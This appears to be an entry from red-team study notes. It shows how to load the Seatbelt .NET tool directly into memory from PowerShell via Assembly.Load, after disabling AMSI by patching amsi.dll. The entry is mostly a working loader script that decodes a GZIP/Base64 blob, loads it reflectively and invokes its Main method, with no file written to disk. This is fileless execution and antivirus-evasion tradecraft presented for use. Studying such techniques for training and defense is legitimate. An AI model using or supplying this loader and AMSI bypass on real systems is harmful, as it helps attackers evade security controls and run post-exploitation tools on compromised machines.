# 16.15 Reflective Assembly Loading in-memory

> Load .NET assemblies (e.g., Seatbelt) straight from memory via `Assembly.Load()` — requires patching `amsi.dll` first (Bypass 2).

## Overview

Load a .NET assembly (e.g. Seatbelt) directly from memory in PowerShell using Assembly.Load(). No file written to disk. Requires patching amsi.dll (Bypass 2) first — amsiInitFailed bypass doesn't cover Assembly.Load().

## Steps

- Compile Seatbelt with public Main() method.
- GZIP + Base64 encode the .exe with CyberChef.
- In PS: decode → decompress → Assembly.Load(bytes) → invoke Main().
- Must use **AMSI Bypass 2** (patch amsi.dll) — Bypass 1 (amsiInitFailed) doesn't cover Assembly::Load.

## Commands

### Invoke-Seatbelt skeleton (reflective load)

```powershell
# First: apply AMSI Bypass 2 (AmsiScanBuffer patch)

function Invoke-Seatbelt {
    [CmdletBinding()]
    Param ([String]$args = " ")
    # Seatbelt.exe → Gzip → Base64 (generated via CyberChef)
    $gzipB64 = "<SNIP>";
    # Decode + decompress
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipStream = New-Object System.IO.Compression.GzipStream(
        (New-Object IO.MemoryStream(, $gzipBytes)),
        [IO.Compression.CompressionMode]::Decompress);
    $outStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($outStream);
    # Load assembly reflectively
    $assembly = [System.Reflection.Assembly]::Load($outStream.ToArray());
    # Redirect STDOUT, invoke Main
    $OldOut = [Console]::Out;
    $sw = New-Object IO.StringWriter;
    [Console]::SetOut($sw);
    [Seatbelt.Program]::Main($args.Split(" "));
    [Console]::SetOut($OldOut);
    $sw.ToString();
}
```
